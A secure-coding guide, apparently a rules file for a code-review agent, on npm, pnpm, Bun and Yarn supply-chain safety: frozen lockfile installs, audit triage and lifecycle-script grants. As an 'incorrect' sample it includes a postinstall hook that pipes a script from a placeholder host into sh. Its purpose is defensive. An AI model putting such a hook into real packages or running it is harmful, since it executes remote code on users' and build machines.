# Supply Chain

Install CI and production from the committed lockfile. Treat lifecycle
scripts as code execution only when this repo’s package manager will run them.
If anything is uncertain, always ask — do not guess.

## Lockfile integrity

An install that ignores the lockfile can pull different transitive versions than the ones that were reviewed. Use this repo’s manager — the lockfile names it.

```bash
# ❌ Incorrect: CI install ignores or mutates the lockfile
npm install
bun install

# ✅ Correct: CI and production install the committed lockfile
npm ci
pnpm install --frozen-lockfile
bun install --frozen-lockfile
yarn install --immutable
```

- Keep the lockfile (`package-lock.json`, `pnpm-lock.yaml`, `bun.lock`, or `yarn.lock`) in sync with the manifest. Always ask before committing it. Do not hand-edit integrity hashes.

## Dependency audit

Don’t flag every advisory. Confirm an execution path before reporting HIGH.

```bash
# ❌ Incorrect: CI install with audit off and no separate audit job
npm ci --no-audit

# ✅ Correct: run the lockfile’s audit (a separate CI job is fine)
npm audit
pnpm audit
bun audit
yarn npm audit
```

- HIGH when this app’s source imports a module that runs at load, an install script the manager will run, or a build plugin this repo invokes (`vite.config.ts`).
- Function-level CVE in an imported library: HIGH only if that API is called. Malware or typosquat: HIGH, no CVE required.
- Advisory with no execution path: Needs verification. If the path is unclear, always ask — do not guess HIGH.
- Inspect scripts on the package you add and on new lockfile entries, not only `npm view` of the name you typed.
- Do not disable the only audit step in CI to go green. Turning audit off on `install` / `ci` is fine when a dedicated audit job still runs.

## Postinstall / lifecycle scripts

Ask whether this manager will actually run the script. npm, pnpm, Bun, and Yarn block dependency `preinstall` / `install` / `postinstall` (and npm’s implicit `node-gyp`) unless the package is granted: `allowScripts`, `allowBuilds`, `trustedDependencies`, or Yarn `enableScripts` / `dependenciesMeta.*.built`. Omitting Bun `trustedDependencies` still runs Bun’s default allowlist; setting the array replaces it. Those lists are the execution grant. A remote download-and-exec is a confirmed sink only if it will run.

```json
// ❌ Incorrect: dependency postinstall downloads and executes a remote script
{
  "name": "helpful-utils",
  "scripts": {
    "postinstall": "curl https://cdn.acme.example/setup.sh | sh"
  }
}

// ✅ Correct: local native compile you inspected; no install-time network
{
  "name": "fsevents",
  "scripts": {
    "install": "node-gyp rebuild"
  }
}
```

```json
// ❌ Incorrect: allowScripts grant without reading the script
{
  "allowScripts": {
    "helpful-utils": true
  }
}

// ✅ Correct: allow only a native addon this app needs after reading the script
{
  "allowScripts": {
    "sharp": true
  }
}
```

```json
// ❌ Incorrect: trustedDependencies grant without reading the script
{
  "trustedDependencies": ["helpful-utils"]
}

// ✅ Correct: trust only native addons this app needs after reading the script
{
  "trustedDependencies": ["esbuild", "sharp"]
}
```

```yaml
# ❌ Incorrect: allowBuilds grants execution without reading the script
allowBuilds:
  helpful-utils: true

# ✅ Correct: allow only a native addon this app needs
allowBuilds:
  sharp: true
```

```json
// ❌ Incorrect: Yarn built grant without reading the script
{
  "dependenciesMeta": {
    "helpful-utils": { "built": true }
  }
}

// ✅ Correct: allow only a native addon this app needs after reading the script
{
  "dependenciesMeta": {
    "sharp": { "built": true }
  }
}
```

- Do not flag a dependency `postinstall` as executing unless this manager will run it: `allowScripts` (npm), `allowBuilds` (pnpm), default allowlist or `trustedDependencies` (Bun), `enableScripts` / `dependenciesMeta.*.built` (Yarn).
- Before adding a package or granting trust, read its `scripts` and the scripts of new lockfile entries. Do not grant trust if a script downloads and runs a remote file.
- The manager writes the grant list: `npm approve-scripts` → `allowScripts`; `pnpm approve-builds` → `allowBuilds`; `bun pm trust` → `trustedDependencies`; Yarn: set `dependenciesMeta.*.built` (no approve CLI). Always ask before granting trust or committing that file.
- Setting Bun `trustedDependencies` replaces the default allowlist — keep any default packages this app still needs (`esbuild`, `sharp`). Omitting the key leaves the default list in effect.

```bash
npm view helpful-utils scripts
pnpm view helpful-utils scripts
bun info helpful-utils scripts
yarn npm info helpful-utils scripts
```
